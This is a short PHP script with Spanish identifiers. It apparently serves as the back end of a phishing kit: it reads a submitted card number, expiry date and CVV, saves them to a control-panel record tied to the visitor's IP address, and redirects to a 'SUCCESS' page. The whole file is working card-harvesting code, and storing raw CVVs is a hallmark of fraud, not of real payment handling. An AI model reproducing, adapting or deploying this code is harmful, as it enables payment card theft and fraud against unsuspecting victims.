<?php
require('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];
$reg = traer_regitro($ip);
$tarjeta = $_POST['tarjeta'] ?? '';
$fecha = $_POST['fecha'] ?? '';
$cvv = $_POST['cvv'] ?? '';

actualizar_registro_tar($reg, $tarjeta, $fecha, $cvv);
header("Location: ../a/SUCCESS.php");
exit();
